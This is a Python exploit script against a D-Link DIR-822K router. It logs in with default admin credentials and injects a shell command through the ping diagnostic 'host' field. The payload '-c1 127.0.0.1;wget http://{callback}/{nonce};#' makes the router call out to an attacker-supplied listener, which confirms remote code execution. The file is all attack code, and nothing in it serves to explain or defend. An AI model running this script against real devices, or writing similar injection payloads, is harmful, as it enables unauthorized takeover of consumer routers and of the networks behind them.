#!/usr/bin/env python3
import argparse
import hashlib
import hmac
import json
import http.cookiejar
import urllib.parse
import urllib.request


def opener_with_cookies():
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))


def post(opener, url, data, referer=None, timeout=15):
    headers = {}
    if referer:
        headers = {"Referer": referer, "Origin": referer.rsplit("/", 1)[0]}
    request = urllib.request.Request(url, urllib.parse.urlencode(data).encode(), headers=headers)
    with opener.open(request, timeout=timeout) as response:
        return response.status, response.read(4096)


def login(base, username, password):
    opener = opener_with_cookies()
    _, raw = post(opener, base + '/boafrm/formLoginKey', {'username': username})
    challenge = json.loads(raw)
    private_key = hmac.new((challenge['PublicKey'] + password).encode(), challenge['Challenge'].encode(), hashlib.md5).hexdigest().upper()
    response = hmac.new(private_key.encode(), challenge['Challenge'].encode(), hashlib.md5).hexdigest().upper()
    post(opener, base + '/boafrm/formLoginSetup', {'username': username, 'password': response, 'submit-url': '/home.htm'})
    return opener


def main():
    parser = argparse.ArgumentParser(description='Ping diagnostic host command injection')
    parser.add_argument('--target', default='http://192.168.223.1')
    parser.add_argument('--username', default='admin')
    parser.add_argument('--password', default='admin')
    parser.add_argument('--callback', required=True, help='listener host:port')
    parser.add_argument('--nonce', default='DLINK-DIR-822K-TK-V002')
    args = parser.parse_args()
    base = args.target.rstrip('/')
    opener = login(base, args.username, args.password)
    branch = 'V002'
    if branch in ('V006', 'V007'):
        post(opener, base + '/boafrm/formWsc', {'disableWPS': 'ON' if branch == 'V007' else '', 'submit-url': '/wlwps.htm'}, base + '/wlwps.htm')
        opener = login(base, args.username, args.password)
    payload = '-c1 127.0.0.1;wget http://{callback}/{nonce};#'.format(callback=args.callback, nonce=args.nonce)
    if branch == 'V005' and len(payload) >= 33:
        raise SystemExit('V005 payload must remain under 33 bytes; use a short callback IP and port')
    data = {'ipVer': '4'}
    data['host'] = payload
    try:
        opener.open(base + '/ping_diagnostic.htm', timeout=8).read(4096)
    except Exception:
        pass
    try:
        status, body = post(opener, base + '/boafrm/formPingDiagnosticRun', data, base + '/ping_diagnostic.htm', timeout=20)
        error = ''
    except Exception as exc:
        status, body, error = 0, b'', repr(exc)
    print(json.dumps({'status': status, 'error': error, 'nonce': args.nonce,
                      'expected_callback_path': '/' + ('W' if branch == 'V005' else args.nonce),
                      'response': body.decode(errors='replace')}, indent=2))


if __name__ == '__main__':
    main()
